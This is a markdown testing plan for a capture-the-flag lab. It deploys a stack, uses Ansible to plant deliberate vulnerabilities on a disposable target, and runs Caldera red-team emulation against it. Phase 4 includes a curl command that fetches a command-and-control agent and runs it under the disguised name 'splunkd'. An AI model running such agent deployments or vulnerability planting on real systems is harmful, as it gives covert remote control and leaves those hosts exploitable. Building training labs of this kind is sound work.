# Deploy Stack — End-to-End Testing Plan

End-to-end validation of the full CTF pipeline: deploy stack → generate vulnerabilities → apply via Ansible → red team emulation via Caldera.

## Infrastructure

| Role | OS | Plan | Purpose |
|------|-----|------|---------|
| Server | Ubuntu 24.04 | vc2-2c-4gb | Runs deploy stack (Traefik, API, Registry, Caldera, Semaphore, Dockhand) |
| Target | Ubuntu 22.04 | vc2-1c-1gb | Receives vulnerabilities via Ansible, runs Caldera agent |

## Phase 1: Provision & Deploy Stack

1. **Create both VPS instances** via CloudLab
2. **On server VPS:**
   - Install Docker + Docker Compose
   - Clone CTF-IT repo
   - Build the base image (`docker build -t ctf-base:latest base/`)
   - Configure `deploy/.env` and root `.env`
   - Configure `deploy/caldera/config/local.yml`
   - Run `docker compose -f deploy/docker-compose.yml up -d`
3. **Verify all containers are healthy:**
   - `docker compose -f deploy/docker-compose.yml ps` — all services "healthy"
   - CTF API responds on port 8000
   - Caldera responds on port 8888
   - Semaphore responds on port 3000

## Phase 2: Generate Vulnerabilities

1. **Register a user** on the CTF API (first user = auto-admin)
2. **Create an event** with a quota that selects vulnerability modules with Caldera metadata
3. **Export Ansible playbook** via `POST /admin/ansible-export` with event quota
4. **Export Caldera plugin** via `POST /admin/caldera-export` with event quota
5. **Verify exports:** unzip both, confirm playbook.yml and plugin structure exist

## Phase 3: Apply Vulnerabilities via Ansible

1. **Install Ansible** on the server VPS (or use Semaphore)
2. **Create inventory** pointing to the target VPS
3. **Run the exported playbook** against the target:
   ```bash
   ansible-playbook -i inventory playbook.yml --become
   ```
4. **Verify vulnerabilities applied** by spot-checking the target (e.g., check for SUID binaries, backup files, weak permissions)

## Phase 4: Caldera Red Team Emulation

1. **Configure Caldera** `local.yml` with server's public IP for agent callbacks
2. **Deploy Sandcat agent** on the target VPS:
   ```bash
   # From the target, download and run the agent
   curl -s http://<server-ip>:8888/file/download -d '{"platform":"linux","file":"sandcat.go","server":"http://<server-ip>:8888"}' > splunkd
   chmod +x splunkd && ./splunkd -server http://<server-ip>:8888 -v
   ```
3. **Import CTF plugin** into Caldera:
   - Unzip the Caldera export
   - Copy `plugins/ctf-exploit/` into Caldera's plugin directory
   - Restart Caldera to load the plugin
4. **Run adversary profile:**
   - Select "CTF Full Exploit Chain" adversary
   - Target the agent on the target VPS
   - Execute the operation
5. **Verify results:**
   - Check Caldera operation report for successful ability execution
   - Confirm recon abilities detected vulnerabilities
   - Confirm exploit abilities extracted data

## Success Criteria

- [ ] All 7 deploy stack containers running and healthy
- [ ] CTF API serves dashboard and admin panel
- [ ] Ansible export generates valid playbook
- [ ] Caldera export generates valid plugin with abilities
- [ ] Playbook applies vulnerabilities to target successfully
- [ ] Caldera agent checks in from target
- [ ] Adversary operation executes recon + exploit abilities
- [ ] At least one vulnerability detected and exploited by Caldera

## Cleanup

- Destroy both VPS instances via CloudLab
- No persistent infrastructure should remain
